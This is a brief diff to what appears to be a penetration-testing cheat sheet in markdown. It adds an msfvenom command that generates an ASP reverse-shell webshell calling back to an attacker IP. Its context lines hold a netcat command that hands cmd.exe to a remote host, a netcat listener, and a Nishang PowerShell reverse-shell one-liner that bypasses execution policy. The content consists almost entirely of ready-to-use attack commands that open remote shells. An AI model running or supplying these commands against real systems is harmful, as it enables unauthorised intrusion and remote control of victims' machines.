@@ -153,8 +153,10 @@ cf : https://github.com/rapid7/metasploit-framework/issues/9556 <br />
 //eg. C:\Inetpub\Scripts\nc.exe -nv 10.11.0.45 1234 -e C:\WINDOWS\System32\cmd.exe
 //Kali(Attacker) : nc -nlvp 4444
 ```
-
-
+-Creating Webshell
+```sh 
+ASP :  msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.45 LPORT=2323 -f asp -a x86 --platform win -o shell.asp
+```
 **Powershell Nishang**<br />
 ```sh 
 powershell -exec bypass -c Import-Module .\Invoke-PowerShellTcp.ps1;Invoke-PowerShellTcp -Reverse -IPAddress 10.*.*.* -Port 1234
